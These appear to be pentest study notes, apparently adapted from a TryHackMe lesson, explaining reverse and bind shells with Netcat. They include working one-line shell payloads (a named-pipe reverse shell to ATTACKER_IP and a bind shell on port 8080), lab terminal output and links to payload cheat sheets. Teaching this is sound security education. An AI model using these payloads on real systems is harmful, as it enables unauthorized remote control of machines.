# 📌 Shells Overview

## Shell Overview
What is a **Shell**?
A **shell** is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Reverse Shell

A **reverse shell**, sometimes referred to as a **"connect back shell,"** is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

How Reverse Shells Work
Set up a Netcat (nc) Listener
Let's now understand how a reverse shell works in a practical scenario using the tool Netcat. This utility supports multiple OSs and allows reading and writing through a network.

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command nc -lvnp 443.

Terminal
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...

The command above uses the -l option to indicate Netcat to listen or wait for a connection. The -v option enables verbose mode. The -n option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the -p flag indicates the port that will be used to wait for the connection, in the case above, port 443.

Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.

Gaining Reverse Shell Access
Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them here(opens in new tab).

As an example, let's analyze an example payload named a pipe reverse shell, as shown below.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`


Explanation of the Payload:

**rm -f /tmp/f** - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.

**mkfifo /tmp/f**- This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

**cat /tmp/f** - This command reads data from the named pipe. It waits for input that can be sent through the pipe.

**| bash -i 2>&1** - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.

**| nc ATTACKER_IP ATTACKER_PORT >/tmp/f** - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).

**>/tmp/f** -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
The payload above can expose the shell bash through the network to the desired listener.

Attacker Receives the Shell
Once the above payload is executed, the attacker will receive a reverse shell, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

Attacker Terminal Output (Receiving Shell)

Terminal

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

The output above shows the connection coming from the IP 10.10.13.37, which is the IP address of the compromised target.

## Bind Shell
As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

How bind shells work
Setting Up the Bind Shell on the Target

Let's create a bind shell. In this case, the attacker can use a command like the one below on the target machine.

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

Explanation of the Payload
**rm -f /tmp/f** - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.

**mkfifo /tmp/f** - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

**cat /tmp/f** - This command reads data from the named pipe. It waits for input that can be sent through the pipe.

**| bash -i 2>&1** - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.

**| nc -l 0.0.0.0 8080** - Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.

**>/tmp/f** This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.
The command above will listen for incoming connections and expose a bash shell. We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.

Terminal on the Target Machine (Bind Shell Setup)

Terminal
```bash
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Once the command is executed, it will wait for an incoming connection, as shown above.

Attacker Connects to the Bind Shell

Now that the target machine is waiting for incoming connections, we can use Netcat again with the following command to connect.

nc -nv TARGET_IP 8080

Explanation of the command
nc - This invokes Netcat, which establishes the connection to the target.
-n - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
-v - Verbose mode provides detailed output of the connection process, such as when the connection is established.
TARGET_IP - The IP address of the target machine where the bind shell is running.
8080 - The port number on which the bind shell listens.

Attacker Terminal (After Connection)

Terminal
```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

After connecting, we can get a shell, as shown above, and execute commands.

# https://www.revshells.com/
# [PayloadsAllTheThings (GitHub)](https://github.com/swisskyrepo/PayloadsAllTheThings)
# [Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)